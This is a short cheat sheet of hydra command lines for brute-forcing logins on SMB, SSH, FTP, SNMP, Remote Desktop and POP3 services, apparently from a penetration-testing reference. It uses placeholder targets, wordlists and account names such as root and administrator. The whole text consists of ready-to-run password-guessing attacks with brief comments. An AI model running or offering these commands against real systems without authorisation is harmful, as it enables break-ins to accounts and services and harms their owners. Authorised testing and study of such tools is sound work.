# hydra: bruteforce smb login 
hydra -L users.txt -P passwords.txt -e nsr smb://targetIp

# hydra: bruteforce ssh login (-V, -v verbose)
hydra -l root -P passwordlist ssh://ipv4Address -V

# hydra: bruteforce ftp login
hydra -t 5 -V -f -C /tmp/wordlist ftp://targetIp

# hydra: bruteforce SNMP
hydra -P password-file.txt -v ipv4Address snmp

# hydra: bruteforce Windows Remote Desktop
hydra -t 1 -V -f -l administrator -P /path/to/wordlist.txt rdp://ipv4Address

# hydra: bruteforce POP3
hydra -l userName -P /path/to/wordlist -f ipv4Address pop3 -V